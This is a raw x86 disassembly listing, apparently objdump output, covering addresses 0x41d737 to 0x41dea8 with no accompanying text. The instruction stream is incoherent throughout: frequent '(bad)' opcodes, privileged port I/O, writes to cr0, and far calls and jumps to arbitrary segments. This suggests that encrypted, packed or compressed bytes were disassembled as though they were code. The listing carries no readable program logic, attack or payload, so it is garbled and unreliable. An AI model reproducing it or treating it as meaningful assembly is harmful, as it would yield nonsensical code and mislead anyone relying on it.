  41d737:	sti    
  41d738:	xor    eax,0x3a6c105b
  41d73d:	call   0x37e3:0xc1c14641
  41d744:	push   edi
  41d745:	ror    ecx,cl
  41d747:	(bad)  
  41d748:	or     eax,0xf5af7800
  41d74d:	repnz push ds
  41d74f:	push   edx
  41d750:	pushf  
  41d751:	loop   0x41d6fe
  41d753:	jne    0x41d72f
  41d755:	mov    bl,0xbd
  41d757:	mov    ebx,0x807778df
  41d75c:	aas    
  41d75d:	xchg   ebp,eax
  41d75e:	jne    0x41d787
  41d760:	sbb    BYTE PTR [ecx*1-0x5bb5a2e2],ch
  41d767:	fbstp  TBYTE PTR cs:[ebx+0x7a82e9f7]
  41d76e:	ins    DWORD PTR es:[edi],dx
  41d76f:	push   esi
  41d770:	ins    BYTE PTR es:[edi],dx
  41d771:	fistp  WORD PTR [eax-0x384f246]
  41d777:	clc    
  41d778:	push   es
  41d779:	push   ebp
  41d77a:	jle    0x41d702
  41d77c:	xor    dl,BYTE PTR [esi]
  41d77e:	jnp    0x41d738
  41d780:	ret    
  41d781:	push   ss
  41d782:	ds push cs
  41d784:	cdq    
  41d785:	pop    esp
  41d786:	inc    esi
  41d787:	shl    DWORD PTR [edx+0x6c031b39],cl
  41d78d:	mov    bh,0x2
  41d78f:	leave  
  41d790:	jg     0x41d7a2
  41d792:	jmp    0x2350:0x80381140
  41d799:	sub    bh,ch
  41d79b:	inc    ebp
  41d79c:	mov    dh,BYTE PTR [edi-0x3e]
  41d79f:	sbb    al,0xfa
  41d7a2:	pushf  
  41d7a3:	lods   al,BYTE PTR ds:[esi]
  41d7a4:	dec    ebp
  41d7a5:	sbb    DWORD PTR [ebx],0xfffffff7
  41d7a8:	cmp    ah,BYTE PTR [ebp-0x26cc7e7b]
  41d7ae:	fisub  DWORD PTR [ebp-0x7076eb4e]
  41d7b4:	sbb    al,BYTE PTR es:[edi-0x778a3d41]
  41d7bb:	push   ebp
  41d7bc:	outs   dx,DWORD PTR ds:[esi]
  41d7bd:	mov    cr0,edx
  41d7c0:	mov    ah,0x85
  41d7c2:	add    bh,BYTE PTR [esi]
  41d7c4:	mov    ds:0xe49e58ff,eax
  41d7c9:	push   eax
  41d7ca:	(bad)  
  41d7cb:	(bad)  
  41d7cc:	imul   edx,DWORD PTR ds:0x5873a291,0x5d
  41d7d3:	jns    0x41d80e
  41d7d5:	or     dh,BYTE PTR [eax-0xae6f99b]
  41d7db:	test   BYTE PTR [esi],ch
  41d7dd:	test   al,0x4d
  41d7df:	pop    esi
  41d7e0:	mov    esi,0x15c6522c
  41d7e5:	neg    ecx
  41d7e7:	out    dx,al
  41d7e8:	repnz rep outs dx,DWORD PTR ds:[esi]
  41d7eb:	daa    
  41d7ec:	out    0x4a,eax
  41d7ee:	imul   ebx,DWORD PTR [esi+0x1ef717cc],0xffffffe9
  41d7f5:	cmp    al,BYTE PTR [ecx+eax*1]
  41d7f8:	cdq    
  41d7f9:	mov    ebx,0x8a30a2b7
  41d7fe:	into   
  41d7ff:	enter  0x3b,0x9b
  41d803:	mov    edx,0x7e1544d6
  41d808:	in     al,0x65
  41d80a:	retf   
  41d80b:	(bad)  
  41d80c:	into   
  41d80d:	sbb    BYTE PTR [ebx-0x7b],al
  41d810:	push   edx
  41d811:	sub    DWORD PTR ds:0x74623c93,esi
  41d817:	sub    edx,DWORD PTR [edx]
  41d819:	scas   eax,DWORD PTR es:[edi]
  41d81a:	inc    eax
  41d81b:	ins    BYTE PTR es:[edi],dx
  41d81c:	push   0x3f5e6e9
  41d821:	call   0x7c32ac2d
  41d826:	outs   dx,BYTE PTR ds:[esi]
  41d827:	std    
  41d828:	jne    0x41d7d7
  41d82a:	icebp  
  41d82b:	mov    BYTE PTR [ebx+0x112f09fe],cl
  41d831:	or     BYTE PTR ds:0xe41d8561,0xcd
  41d838:	push   0x245c2262
  41d83d:	inc    ebx
  41d83e:	inc    esi
  41d83f:	out    0xf0,eax
  41d841:	fdivr  st(1),st
  41d843:	and    edi,edx
  41d845:	xor    BYTE PTR [esi],dh
  41d847:	xchg   esp,eax
  41d848:	dec    ebx
  41d849:	jo     0x41d8b9
  41d84b:	pop    es
  41d84c:	adc    ebx,DWORD PTR [ecx-0x53d0d609]
  41d852:	mov    BYTE PTR [eax+0x7e],al
  41d855:	scas   eax,DWORD PTR es:[edi]
  41d856:	pop    ds
  41d857:	mov    bh,0x22
  41d859:	push   0x2b8ed847
  41d85e:	xor    ebp,DWORD PTR [ebx]
  41d860:	xor    BYTE PTR [edx+eiz*4],0x9e
  41d864:	out    0x48,eax
  41d866:	cmp    al,bl
  41d868:	outs   dx,BYTE PTR ds:[esi]
  41d869:	cs addr16 push edi
  41d86c:	jp     0x41d8c7
  41d86e:	fwait
  41d86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d870:	ficom  DWORD PTR [eax+0x26]
  41d873:	xchg   ax,ax
  41d875:	sbb    dl,bh
  41d877:	mov    esi,0x869a7de
  41d87c:	or     al,0x0
  41d87e:	inc    ecx
  41d87f:	xor    esp,DWORD PTR [edx-0x5e]
  41d882:	jb     0x41d8de
  41d884:	xor    al,BYTE PTR [edi-0x19870081]
  41d88a:	jnp    0x41d827
  41d88c:	or     BYTE PTR [ebx+ebx*4-0x6f],al
  41d890:	pop    ss
  41d891:	(bad)  
  41d892:	rcr    BYTE PTR [ebp-0x39],cl
  41d895:	xchg   edx,eax
  41d896:	out    dx,al
  41d897:	fild   DWORD PTR [esi-0x431a0f30]
  41d89d:	jo     0x41d820
  41d89f:	push   eax
  41d8a0:	lds    esp,FWORD PTR [edx+esi*1+0x371d7524]
  41d8a7:	(bad)  
  41d8a8:	xor    eax,0x7e93f6b8
  41d8ad:	jne    0x41d86d
  41d8af:	push   esi
  41d8b0:	add    BYTE PTR [edx],0xd9
  41d8b3:	je     0x41d877
  41d8b5:	ret    0xb11d
  41d8b8:	or     al,0xf
  41d8ba:	jb     0x41d89a
  41d8bc:	cli    
  41d8bd:	loope  0x41d8cd
  41d8bf:	in     al,dx
  41d8c0:	shl    DWORD PTR [ebp+0x52],1
  41d8c3:	or     eax,0xdc0b3363
  41d8c8:	jae    0x41d936
  41d8ca:	stos   DWORD PTR es:[edi],eax
  41d8cb:	add    DWORD PTR [edx+0x40d716bf],esp
  41d8d1:	in     eax,dx
  41d8d2:	jns    0x41d858
  41d8d4:	rcl    BYTE PTR [esi+0xf],0x93
  41d8d8:	push   ds
  41d8d9:	int3   
  41d8da:	stos   DWORD PTR es:[edi],eax
  41d8db:	je     0x41d8b8
  41d8dd:	cmp    eax,DWORD PTR [edi-0x7b]
  41d8e0:	aad    0xa2
  41d8e2:	pop    ebp
  41d8e3:	fistp  WORD PTR [ebp+0x268a0de2]
  41d8e9:	and    DWORD PTR [ecx],edx
  41d8eb:	push   ebx
  41d8ec:	in     eax,dx
  41d8ed:	in     al,0x6f
  41d8ef:	pop    ds
  41d8f0:	icebp  
  41d8f1:	shl    BYTE PTR [eax],0x28
  41d8f4:	(bad)  
  41d8f6:	inc    ebp
  41d8f7:	rcr    BYTE PTR [ebx-0x3bde921d],0x1f
  41d8fe:	stos   BYTE PTR es:[edi],al
  41d8ff:	sub    al,0xbe
  41d901:	jge    0x41d959
  41d903:	es rcr ebp,cl
  41d906:	lahf   
  41d907:	arpl   WORD PTR [edi+ebx*8+0x6d12f4f3],bx
  41d90e:	mov    cl,0x62
  41d910:	adc    ebx,DWORD PTR [ecx]
  41d912:	ror    bl,cl
  41d914:	jle    0x41d98d
  41d916:	inc    ebx
  41d917:	daa    
  41d918:	int3   
  41d919:	fbstp  TBYTE PTR [edx-0x5c471fa6]
  41d91f:	ror    DWORD PTR [esi+0x7d],0xb6
  41d923:	xchg   ebp,eax
  41d924:	in     al,dx
  41d925:	fsubr  st(2),st
  41d927:	out    dx,eax
  41d928:	jmp    0x41d8d3
  41d92a:	out    0x13,al
  41d92c:	xor    eax,0x7a18ca78
  41d931:	gs test eax,0xabb387f8
  41d937:	or     ebx,ebp
  41d939:	in     eax,dx
  41d93a:	aas    
  41d93b:	mov    eax,ds:0x4a37fe06
  41d940:	fisubr DWORD PTR [ecx-0x68]
  41d943:	fcmove st,st(3)
  41d945:	mov    ds:0xc51c254d,al
  41d94a:	push   ds
  41d94b:	xlat   BYTE PTR ds:[ebx]
  41d94c:	mov    WORD PTR [ebx],?
  41d94e:	dec    eax
  41d94f:	jl     0x41d92b
  41d951:	mov    cl,0x4b
  41d953:	sbb    cx,WORD PTR [edx+0x68ee925b]
  41d95a:	jmp    0x41d901
  41d95c:	mov    ss,WORD PTR [ebx+0x50392a16]
  41d962:	fist   WORD PTR [ecx+0x434f3e03]
  41d968:	jle    0x41d99a
  41d96a:	mov    ds:0xc7f4ca28,eax
  41d96f:	sub    al,0xe0
  41d971:	test   BYTE PTR [edx-0xd],ah
  41d974:	int    0xd4
  41d976:	add    BYTE PTR [esi+edi*8-0x619bcc25],0xc0
  41d97e:	lahf   
  41d97f:	les    edi,FWORD PTR [ebx-0x56]
  41d982:	mov    bh,0xe1
  41d984:	aad    0x8a
  41d986:	bound  ecx,QWORD PTR [ecx-0x31]
  41d989:	or     cl,BYTE PTR [ecx]
  41d98b:	inc    ebp
  41d98c:	lahf   
  41d98d:	int3   
  41d98e:	pop    ebx
  41d98f:	jae    0x41da00
  41d991:	(bad)
  41d995:	mov    al,0x30
  41d997:	int    0x3c
  41d999:	mov    esp,0xa3ac872a
  41d99e:	dec    edi
  41d99f:	imul   ebx,DWORD PTR [edx],0x9c8750
  41d9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a6:	xor    eax,DWORD PTR [ecx]
  41d9a8:	ds dec ecx
  41d9aa:	outs   dx,DWORD PTR ds:[esi]
  41d9ab:	mov    cs,WORD PTR [ebx]
  41d9ad:	inc    esp
  41d9af:	mov    cl,0xe8
  41d9b1:	stos   BYTE PTR es:[edi],al
  41d9b2:	mov    esi,0x46eb02a6
  41d9b7:	aaa    
  41d9b8:	int3   
  41d9b9:	mov    edx,0x6ff9730e
  41d9be:	jge    0x41d9b2
  41d9c0:	push   ebx
  41d9c1:	xchg   ecx,eax
  41d9c2:	jecxz  0x41da17
  41d9c4:	jb     0x41d99e
  41d9c6:	imul   ebp,DWORD PTR [eax],0xa9da8901
  41d9cc:	mov    cl,cl
  41d9ce:	jl     0x41d9fc
  41d9d0:	cmc    
  41d9d1:	inc    esi
  41d9d2:	call   0xfe83:0xfa205e64
  41d9d9:	sbb    bl,dl
  41d9db:	lods   al,BYTE PTR ds:[esi]
  41d9dc:	sub    DWORD PTR [ebp+0x6],edi
  41d9df:	outs   dx,DWORD PTR ds:[esi]
  41d9e0:	shr    BYTE PTR [ebx-0x34],0x29
  41d9e4:	hlt    
  41d9e5:	and    al,BYTE PTR [edx+ebx*4-0x34]
  41d9e9:	mov    ds,esi
  41d9eb:	retf   
  41d9ec:	dec    ebx
  41d9ed:	mov    ds:0x88df3b06,al
  41d9f2:	popa   
  41d9f3:	mov    dh,0x17
  41d9f5:	ds inc ebp
  41d9f7:	stos   DWORD PTR es:[edi],eax
  41d9f8:	mov    esi,0xecb3562f
  41d9fd:	xchg   ebp,eax
  41d9fe:	add    al,0xf7
  41da00:	cmp    DWORD PTR [eax],edx
  41da02:	sbb    BYTE PTR [ebx],dl
  41da04:	mov    dl,0xf7
  41da06:	mov    ebx,?
  41da08:	mov    edx,0x3353f21b
  41da0d:	sub    eax,0x222dc1ee
  41da12:	jg     0x41da53
  41da14:	fadd   DWORD PTR [ebx+0x78aa1855]
  41da1a:	mov    ebx,0xf5f256f
  41da1f:	and    ebx,DWORD PTR [esi-0x7d321ae0]
  41da25:	fsub   st(1),st
  41da27:	and    DWORD PTR [esp+ebx*4+0x17],ebp
  41da2b:	pop    ds
  41da2c:	das    
  41da2d:	mov    DWORD PTR [edi],esp
  41da2f:	(bad)  
  41da30:	lock mov al,ds:0x685e1e69
  41da36:	push   ss
  41da37:	sub    dl,BYTE PTR [ecx]
  41da39:	jne    0x41daac
  41da3b:	(bad)  
  41da3c:	add    DWORD PTR es:[ebx+0x6e],edx
  41da40:	sub    bh,cl
  41da42:	dec    eax
  41da43:	shl    DWORD PTR [eax+ebp*2+0x2d],cl
  41da47:	and    ecx,DWORD PTR [eax-0x20]
  41da4a:	imul   edx,DWORD PTR [ebp-0x2f],0x3844e1be
  41da51:	xchg   ebx,eax
  41da52:	dec    ebp
  41da53:	push   esp
  41da54:	or     eax,0x7b24a6f4
  41da59:	into   
  41da5a:	and    al,0x37
  41da5c:	lods   eax,DWORD PTR ds:[esi]
  41da5d:	dec    esi
  41da5e:	jmp    0x8bb06336
  41da63:	leave  
  41da64:	(bad)  
  41da66:	xchg   ebp,eax
  41da67:	lds    esi,FWORD PTR [ecx]
  41da69:	jl     0x41daaf
  41da6b:	aaa    
  41da6c:	jmp    0x41daa5
  41da6e:	je     0x41dadf
  41da70:	cmp    DWORD PTR [ebx+eax*1+0x6a744145],esi
  41da77:	ficom  DWORD PTR [ecx-0x73]
  41da7a:	mov    ebx,0xa0d932e3
  41da7f:	cmp    bl,cl
  41da81:	cmp    DWORD PTR [ecx+ebp*1],ecx
  41da84:	stc    
  41da85:	loop   0x41da7e
  41da87:	(bad)  [esi]
  41da89:	gs push esp
  41da8b:	ss stc 
  41da8d:	inc    esp
  41da8e:	lods   al,BYTE PTR ds:[esi]
  41da8f:	add    DWORD PTR [esi-0x31aac696],0xffffffc2
  41da96:	(bad)  
  41da97:	imul   ebx,DWORD PTR [ebx-0x59],0x93b09ca0
  41da9e:	push   ebp
  41da9f:	pop    ds
  41daa0:	jne    0x41daee
  41daa2:	push   edx
  41daa3:	dec    ebp
  41daa4:	mov    BYTE PTR ds:0x48e6e577,bh
  41daaa:	(bad)  
  41daab:	jg     0x41da85
  41daad:	push   edx
  41daae:	cs loop 0x41dacb
  41dab1:	stos   BYTE PTR es:[edi],al
  41dab2:	enter  0x7908,0x18
  41dab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab7:	test   al,0x72
  41dab9:	mov    dl,0xc4
  41dabb:	pop    ebx
  41dabc:	test   edi,0x7322c5ad
  41dac2:	xchg   BYTE PTR ds:[ecx+0xb],al
  41dac6:	xchg   DWORD PTR [esi-0x76],edx
  41dac9:	jmp    0xea5bb25
  41dace:	jnp    0x41db1f
  41dad0:	shr    DWORD PTR ds:0xb7bf0244,0x59
  41dad7:	fsub   QWORD PTR [edi]
  41dad9:	std    
  41dada:	stos   DWORD PTR es:[edi],eax
  41dadb:	push   ecx
  41dadc:	pop    ss
  41dadd:	and    eax,0xf19169fa
  41dae2:	ja     0x41da7e
  41dae4:	dec    esi
  41dae5:	fst    QWORD PTR [esi+0x25]
  41dae8:	imul   ebx,DWORD PTR ds:0x4cc6aa91,0x1f8ec94
  41daf2:	cs scas al,BYTE PTR es:[edi]
  41daf4:	popf   
  41daf5:	xchg   ecx,eax
  41daf6:	jmp    0xe118d4b4
  41dafb:	(bad)  
  41dafc:	pop    ds
  41dafd:	sub    BYTE PTR [ecx+ecx*4-0x74],dh
  41db01:	adc    eax,0x8275402e
  41db06:	xlat   BYTE PTR ds:[ebx]
  41db07:	pushf  
  41db08:	shr    DWORD PTR [edi+0x1c511a8f],1
  41db0e:	adc    esi,eax
  41db10:	outs   dx,DWORD PTR ds:[esi]
  41db11:	call   0xaad0a863
  41db16:	shl    DWORD PTR [ebx+0x76c04ba8],1
  41db1c:	mov    ds:0x4ab5faa8,eax
  41db21:	fisttp QWORD PTR [edx]
  41db23:	sbb    ch,BYTE PTR fs:[esp+edx*1-0x42ad5c5c]
  41db2b:	cli    
  41db2c:	scas   eax,DWORD PTR es:[edi]
  41db2d:	stos   DWORD PTR es:[edi],eax
  41db2e:	(bad)  
  41db2f:	das    
  41db30:	test   DWORD PTR [ebx],esi
  41db32:	pusha  
  41db33:	pop    eax
  41db34:	mov    al,0xdf
  41db36:	dec    esp
  41db37:	lds    esi,FWORD PTR [edi+edx*8-0x3f81dfed]
  41db3e:	jb     0x41db92
  41db40:	sub    DWORD PTR [edi+0x4b],esp
  41db43:	aaa    
  41db44:	pusha  
  41db45:	cld    
  41db46:	push   edx
  41db47:	lods   eax,DWORD PTR ds:[esi]
  41db48:	dec    edx
  41db49:	push   edx
  41db4a:	in     al,0xb2
  41db4c:	mov    dh,ah
  41db4e:	push   cs
  41db4f:	jp     0x41daf6
  41db51:	gs in  eax,0xcb
  41db54:	xchg   BYTE PTR [esi-0x3337f85c],cl
  41db5a:	and    eax,0x7dd80c1b
  41db5f:	sub    DWORD PTR [ebp+0xc1da16c],0x1f
  41db66:	xchg   al,ah
  41db68:	mov    al,0x6e
  41db6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db6b:	adc    DWORD PTR [edx],edx
  41db6d:	(bad)  
  41db6e:	pop    ecx
  41db6f:	mov    ch,0x6b
  41db71:	dec    esp
  41db72:	jno    0x41db77
  41db74:	ins    BYTE PTR es:[edi],dx
  41db75:	pop    ecx
  41db76:	inc    esi
  41db77:	sbb    BYTE PTR [edx+0x59],0xc5
  41db7b:	jge    0x41db8b
  41db7d:	sbb    eax,0x62e7b50
  41db82:	dec    esp
  41db83:	xchg   edx,eax
  41db84:	cmp    DWORD PTR [esi-0x4b],eax
  41db87:	xchg   edi,eax
  41db88:	sub    BYTE PTR [edx-0x4f],dh
  41db8b:	loopne 0x41db0e
  41db8d:	inc    esi
  41db8e:	push   eax
  41db8f:	mov    ah,0x1e
  41db91:	mov    ecx,0x90a9ed73
  41db96:	xor    al,0x76
  41db98:	rcr    DWORD PTR [eax],1
  41db9a:	xor    cl,BYTE PTR [ecx+0x780b11b8]
  41dba0:	push   esi
  41dba1:	and    eax,ebp
  41dba3:	sbb    BYTE PTR [edx+0x18b2cc73],dl
  41dba9:	int3   
  41dbaa:	mov    ebx,0x20b42fae
  41dbaf:	sub    dh,ch
  41dbb1:	mov    esi,DWORD PTR [edi]
  41dbb3:	push   0xcb902b3a
  41dbb8:	stos   DWORD PTR es:[edi],eax
  41dbb9:	aas    
  41dbba:	mov    bl,BYTE PTR [eax-0x7c]
  41dbbd:	cld    
  41dbbe:	mov    ds:0x44d31076,al
  41dbc3:	xor    al,0x2
  41dbc5:	ins    BYTE PTR es:[edi],dx
  41dbc6:	xor    ah,BYTE PTR [ecx-0x5]
  41dbc9:	pop    edi
  41dbca:	dec    edi
  41dbcb:	ficomp WORD PTR [eax]
  41dbcd:	retf   0xd470
  41dbd0:	dec    esp
  41dbd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd2:	jb     0x41dc09
  41dbd4:	inc    esp
  41dbd5:	out    0x69,eax
  41dbd7:	xor    al,0x70
  41dbd9:	sbb    ch,ah
  41dbdb:	mov    dh,bl
  41dbdd:	mov    esp,0xa7d042be
  41dbe2:	sub    dl,BYTE PTR [esi+0x71]
  41dbe5:	mov    ds:0x233fe170,eax
  41dbea:	fnstcw WORD PTR [ebx+0x5a]
  41dbed:	pop    edx
  41dbee:	shr    DWORD PTR [ebp+0x6697ec8d],cl
  41dbf4:	mov    bh,bl
  41dbf6:	jg     0x41db8b
  41dbf8:	mov    ch,dh
  41dbfa:	mov    eax,ds:0x6076b73d
  41dbff:	lods   eax,DWORD PTR ds:[esi]
  41dc00:	mov    DWORD PTR [esp+ecx*4],edx
  41dc03:	mov    bl,0x54
  41dc05:	push   ebx
  41dc06:	xchg   esi,eax
  41dc07:	call   0x8f43:0x920b5264
  41dc0e:	sbb    DWORD PTR [esi-0x553a29ec],ebx
  41dc14:	sub    edi,DWORD PTR [ebp+0x69792a16]
  41dc1a:	imul   esp,DWORD PTR [ecx+0x53739c4f],0x65
  41dc21:	(bad)  
  41dc22:	fbstp  TBYTE PTR [ebx+eiz*1]
  41dc25:	adc    ecx,DWORD PTR [edi+eax*2-0x71]
  41dc29:	jecxz  0x41dbb4
  41dc2b:	lods   eax,DWORD PTR gs:[esi]
  41dc2d:	sub    ch,BYTE PTR [edx-0x65b5942b]
  41dc33:	add    al,0x91
  41dc35:	and    ah,cl
  41dc37:	jnp    0x41dc2f
  41dc39:	into   
  41dc3a:	mov    esp,0x76c5ea83
  41dc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc40:	or     DWORD PTR [edx],esi
  41dc42:	xor    DWORD PTR [esi],edi
  41dc44:	sub    BYTE PTR [edx],al
  41dc46:	bound  ebx,QWORD PTR [esi]
  41dc48:	jmp    0xe7e74374
  41dc4d:	pop    ebp
  41dc4e:	and    esp,DWORD PTR [ebx+0x40eab171]
  41dc54:	jbe    0x41dc0a
  41dc56:	arpl   WORD PTR [ecx+eax*4],bp
  41dc59:	rol    DWORD PTR [ebx],1
  41dc5b:	aaa    
  41dc5c:	sub    DWORD PTR [eax+0x4a],ebx
  41dc5f:	(bad)  [esp+edx*4+0x7c15b7f5]
  41dc66:	cmc    
  41dc67:	dec    ecx
  41dc68:	or     eax,0xafe9e6ae
  41dc6d:	nop
  41dc6e:	les    esi,FWORD PTR [eax+0x3f]
  41dc71:	fdivr  DWORD PTR [edx-0x66]
  41dc74:	sub    esi,ecx
  41dc76:	out    dx,al
  41dc77:	adc    eax,0x8cb6b9eb
  41dc7c:	leave  
  41dc7d:	xchg   esp,eax
  41dc7e:	rcl    DWORD PTR [ecx+0x79],0xae
  41dc82:	fmulp  st(6),st
  41dc84:	sub    eax,0x7909611f
  41dc89:	sub    al,0xd4
  41dc8b:	ds dec ecx
  41dc8d:	mov    ah,bl
  41dc8f:	ja     0x41dc1f
  41dc91:	jmp    0x566f7352
  41dc96:	jae    0x41dc32
  41dc98:	setne  al
  41dc9b:	sahf   
  41dc9c:	mov    edx,0x8ea716ea
  41dca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dca2:	stos   DWORD PTR es:[edi],eax
  41dca3:	push   0xc9d28475
  41dca8:	mov    ecx,0x7bad4df3
  41dcad:	neg    DWORD PTR [eax]
  41dcaf:	inc    edx
  41dcb0:	ret    
  41dcb1:	push   edx
  41dcb2:	call   DWORD PTR [ebp-0x10]
  41dcb5:	lods   al,BYTE PTR ds:[esi]
  41dcb6:	inc    ebx
  41dcb7:	icebp  
  41dcb8:	das    
  41dcb9:	int3   
  41dcba:	inc    ebp
  41dcbb:	jmp    0xa6ec71e1
  41dcc0:	jo     0x41dc8c
  41dcc2:	ret    
  41dcc3:	popa   
  41dcc4:	inc    esi
  41dcc5:	push   ecx
  41dcc6:	and    al,0xd4
  41dcc8:	fdivrp st(7),st
  41dcca:	cdq    
  41dccb:	jb     0x41dc90
  41dccd:	xchg   edi,eax
  41dcce:	and    esp,esi
  41dcd0:	sub    ebx,DWORD PTR [eax-0x33]
  41dcd3:	xor    DWORD PTR [eax+0x41],eax
  41dcd6:	inc    edi
  41dcd7:	mov    ebx,0x3acd18b0
  41dcdc:	pop    ebp
  41dcdd:	sbb    DWORD PTR [edx],eax
  41dcdf:	add    BYTE PTR [ecx],bh
  41dce1:	shl    BYTE PTR [edx+eiz*4],0x45
  41dce5:	push   0x7ceeed66
  41dcea:	dec    edi
  41dceb:	add    DWORD PTR [ebp+0x1d],edx
  41dcee:	outs   dx,DWORD PTR ds:[esi]
  41dcef:	inc    ebp
  41dcf0:	icebp  
  41dcf1:	inc    edx
  41dcf2:	ffreep st(6)
  41dcf4:	push   ss
  41dcf5:	dec    ebp
  41dcf6:	or     DWORD PTR ds:0xeb7bef57,0x44
  41dcfd:	ja     0x41dcb4
  41dcff:	inc    ebx
  41dd00:	adc    eax,0xb68e346c
  41dd05:	fs pop esi
  41dd07:	not    BYTE PTR [ecx+0x14]
  41dd0a:	adc    ecx,DWORD PTR [ecx-0x65c9f939]
  41dd10:	lods   al,BYTE PTR ds:[esi]
  41dd11:	mov    WORD PTR [edi+0x2ac5a1c4],gs
  41dd17:	dec    edi
  41dd18:	sub    BYTE PTR [ebp-0x25],bh
  41dd1b:	add    bl,BYTE PTR [edi+0x3d07557a]
  41dd21:	pusha  
  41dd22:	or     esi,DWORD PTR fs:[ecx+0x12]
  41dd26:	jnp    0x41dcc2
  41dd28:	pop    ebx
  41dd29:	out    0x66,eax
  41dd2b:	sahf   
  41dd2c:	cmp    esp,DWORD PTR ds:0xd1d5a990
  41dd32:	push   ss
  41dd33:	call   0xf170:0x162b6487
  41dd3a:	(bad)  
  41dd3b:	mov    eax,0x7f5342b2
  41dd40:	push   0x3c6fedb2
  41dd45:	xor    DWORD PTR [edx-0x1ed1afbf],ebp
  41dd4b:	pop    ss
  41dd4c:	sub    DWORD PTR [ecx-0xa],0xffffff8b
  41dd50:	pop    edi
  41dd51:	jle    0x41ddbe
  41dd53:	inc    esi
  41dd54:	lea    eax,[ecx+ebx*8]
  41dd57:	jmp    0xe82c:0xfd703988
  41dd5e:	xor    eax,0x8801e0d1
  41dd63:	adc    BYTE PTR [edx+0x7d],0x4
  41dd67:	pop    edx
  41dd68:	in     eax,dx
  41dd69:	imul   edi,DWORD PTR [esi+ebx*4-0x75],0xfffffff8
  41dd6e:	adc    edx,eax
  41dd70:	jmp    0x14ee:0xfaad79d5
  41dd77:	adc    dl,BYTE PTR [esi]
  41dd79:	pop    ebp
  41dd7a:	ret    
  41dd7b:	cwde   
  41dd7c:	std    
  41dd7d:	jl     0x41dda3
  41dd7f:	leave  
  41dd80:	add    al,0x26
  41dd82:	(bad)  
  41dd83:	adc    BYTE PTR [ebx+0x695aa32],ah
  41dd89:	push   ds
  41dd8a:	mov    esp,0x37b4b37e
  41dd8f:	add    eax,0xbcb285cd
  41dd94:	call   0xbf7e:0x5bad62b7
  41dd9b:	nop
  41dd9c:	jmp    0xd75cee73
  41dda1:	push   edi
  41dda2:	add    al,0xc1
  41dda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda5:	loope  0x41dd3e
  41dda7:	je     0x41dd78
  41dda9:	and    edx,0xe01e622b
  41ddaf:	lock push edi
  41ddb1:	ds test eax,0x36ad2d4d
  41ddb7:	lahf   
  41ddb8:	out    dx,eax
  41ddb9:	mov    eax,ds:0x6d16483d
  41ddbe:	mov    edx,0xd7b07df8
  41ddc3:	sub    eax,0xadfcb186
  41ddc8:	jae    0x41de43
  41ddca:	sar    edx,1
  41ddcc:	sbb    DWORD PTR [ecx+0x24ced8a2],ecx
  41ddd2:	add    ebp,eax
  41ddd4:	adc    al,0x9d
  41ddd6:	xor    DWORD PTR [esp+ebp*2],ecx
  41ddd9:	push   0x18d0eb3e
  41ddde:	jecxz  0x41ddfc
  41dde0:	cli    
  41dde1:	ins    BYTE PTR es:[edi],dx
  41dde2:	mul    BYTE PTR [edx+0x5a]
  41dde5:	or     BYTE PTR [edx+0x39],0xcb
  41dde9:	ror    DWORD PTR ds:0x97aa7688,0x7f
  41ddf0:	fnstcw WORD PTR [edi+0x33]
  41ddf3:	sar    BYTE PTR [ebx+0x53],0xc7
  41ddf7:	mov    bh,0x1a
  41ddf9:	outs   dx,DWORD PTR ds:[esi]
  41ddfa:	adc    eax,0x430bff6f
  41ddff:	jne    0x41dda6
  41de01:	retf   
  41de02:	xchg   ebx,eax
  41de03:	cld    
  41de04:	stc    
  41de05:	out    0xbd,eax
  41de07:	cmp    al,0x1a
  41de09:	out    dx,al
  41de0a:	es dec esi
  41de0c:	sub    cl,BYTE PTR [esi+0x809cd9e]
  41de12:	dec    eax
  41de13:	lea    ebx,[ebp-0x14]
  41de16:	aas    
  41de17:	mov    WORD PTR [eax+0x2a],fs
  41de1a:	add    DWORD PTR [ecx+0x497442da],0xffffffb9
  41de21:	fisubr WORD PTR [edi-0x514e7b09]
  41de27:	(bad)  
  41de28:	dec    ecx
  41de29:	out    dx,al
  41de2a:	mov    bl,ch
  41de2c:	push   0x4fed74e3
  41de31:	add    al,0x4e
  41de33:	repz hlt 
  41de35:	mov    esi,0xd720a4
  41de3a:	adc    edi,DWORD PTR [ebx-0x564a3d1e]
  41de40:	(bad)
  41de43:	adc    al,0x47
  41de45:	loop   0x41de67
  41de47:	ret    0x5489
  41de4a:	scas   al,BYTE PTR es:[edi]
  41de4b:	out    dx,al
  41de4c:	pop    edx
  41de4e:	dec    edi
  41de4f:	mov    esp,0xfb07d458
  41de54:	(bad)  
  41de55:	cmp    DWORD PTR ds:0x6d13c922,ebp
  41de5b:	push   ds
  41de5c:	shr    DWORD PTR [eax-0x72],cl
  41de5f:	jne    0x41debe
  41de61:	inc    eax
  41de62:	push   esp
  41de63:	sub    dh,BYTE PTR [edi-0x6049e8e2]
  41de69:	fcmove st,st(3)
  41de6b:	lds    ebx,FWORD PTR [ebp+0x44]
  41de6e:	(bad)  
  41de70:	jle    0x41de32
  41de72:	pop    es
  41de73:	adc    edi,edi
  41de75:	outs   dx,BYTE PTR ds:[esi]
  41de76:	ret    
  41de77:	sbb    eax,0xc21222ef
  41de7c:	in     eax,dx
  41de7d:	xchg   ecx,eax
  41de7e:	adc    eax,0xea822a69
  41de83:	pop    ecx
  41de84:	inc    esp
  41de85:	in     eax,0x3d
  41de87:	adc    al,0xc0
  41de89:	int    0x19
  41de8b:	loop   0x41dec4
  41de8d:	push   edi
  41de8e:	dec    esi
  41de8f:	pushf  
  41de90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de91:	add    eax,0x1667023e
  41de96:	push   cs
  41de97:	push   edx
  41de98:	sub    bl,ah
  41de9a:	pop    es
  41de9b:	sahf   
  41de9c:	dec    ecx
  41de9d:	inc    edx
  41de9e:	adc    al,0xc9
  41dea0:	sub    ebp,esp
  41dea2:	cs push 0x1b
  41dea5:	hlt    
  41dea6:	jnp    0x41de7d
  41dea8:	cmp    eax,0x5542c5b
